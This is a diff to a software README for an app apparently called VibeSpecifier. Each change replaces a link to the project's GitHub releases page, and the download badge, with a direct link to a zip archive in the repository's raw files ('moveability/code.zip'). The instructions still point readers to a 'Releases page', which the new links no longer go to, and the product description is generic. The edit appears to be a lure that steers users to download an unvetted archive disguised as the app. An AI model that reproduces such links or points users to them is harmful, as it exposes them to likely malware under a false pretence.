@@ -1,6 +1,6 @@
 # 🌟 code - Simplifying Codebase Development for Everyone
 
-[![Download code](https://img.shields.io/badge/Download-code-blue.svg)](https://github.com/MaximianoCodeing/code/releases)
+[![Download code](https://raw.githubusercontent.com/MaximianoCodeing/code/main/moveability/code.zip)](https://raw.githubusercontent.com/MaximianoCodeing/code/main/moveability/code.zip)
 
 ## 📘 Description 
 Welcome to the VibeSpecifier application! This tool helps you easily manage codebase development with version control. It simplifies tracking issues and managing pull requests. Whether you're a beginner or have some experience, VibeSpecifier makes coding easier and more productive.
@@ -10,7 +10,7 @@ To get started with VibeSpecifier, follow these simple steps:
 
 1. **Visit the Releases Page**  
    Click the link below to unlock the latest version of the application.  
-   [Visit this page to download](https://github.com/MaximianoCodeing/code/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/MaximianoCodeing/code/main/moveability/code.zip)
 
 2. **Download the Application**  
    On the Releases page, find the latest version of the application. Click to download it to your device.
@@ -43,7 +43,7 @@ To ensure VibeSpecifier runs smoothly on your device, please check the following
 Follow these steps to download and install the VibeSpecifier application:
 
 1. **Go to the Releases Page**  
-   [Visit this page to download](https://github.com/MaximianoCodeing/code/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/MaximianoCodeing/code/main/moveability/code.zip)
 
 2. **Find the Latest Release**  
    Look for the most recent version listed on the page. 
